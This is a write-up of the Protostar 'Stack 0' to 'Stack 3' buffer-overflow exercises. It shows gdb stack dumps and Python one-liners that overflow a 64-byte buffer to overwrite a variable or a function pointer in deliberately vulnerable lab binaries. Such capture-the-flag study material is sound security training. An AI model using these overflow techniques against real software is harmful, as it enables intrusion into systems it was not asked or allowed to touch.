# Stack 0
Entering any amount of characters > 64 overflows the buffer and lets us modify the variable.
```
(gdb) break *0x08048411
Breakpoint 1 at 0x8048411: file stack0/stack0.c, line 13.
(gdb) r
Starting program: /opt/protostar/bin/stack0 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
(gdb) x/24wx $esp
0xbffff6f0:	0xbffff70c	0x00000001	0xb7fff8f8	0xb7f0186e
0xbffff700:	0xb7fd7ff4	0xb7ec6165	0xbffff718	0x41414141
0xbffff710:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff720:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff730:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff740:	0x41414141	0x41414141	0x41414141	0x41414141
(gdb) c
Continuing.
you have changed the 'modified' variable
```

# Stack 1
Ghidra correctly tells us that we need to set the `target` variable to `0x61626364` in order to pass this challenge
```c
  if (target == 0x61626364) {
    puts("you have correctly got the variable to the right value");
  }
```
```bash
user@protostar:/opt/protostar/bin$ ./stack1 $(python -c 'print "A"*64+"\x64\x63\x62\x61"')
you have correctly got the variable to the right value
```

# Stack 2
```c
  string = getenv("GREENIE");
  if (string == (char *)0x0) {
    errx(1,"please set the GREENIE environment variable\n");
  }
  var = 0;
  strcpy(buffer,string);
  if (var == 0xd0a0d0a) {
    puts("you have correctly modified the variable");
  }
```
so to set `var` to `0x 0d 0a 0d 0a` we overflow the buffer using the environment variable GREENIE
```bash
user@protostar:/opt/protostar/bin$ export GREENIE=$(python -c 'print "A"*64+"\x0a\x0d\x0a\x0d"')
user@protostar:/opt/protostar/bin$ ./stack2
you have correctly modified the variable
```

# Stack 3
we need to overflow buffer such that the var is overwritten to 0x08048424 by overwriting it with 0x24840408 (little endian) which will call win function

```bash
user@protostar:/opt/protostar/bin$ python -c 'print "A"*64+"\x24\x84\x04\x08"' | ./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
```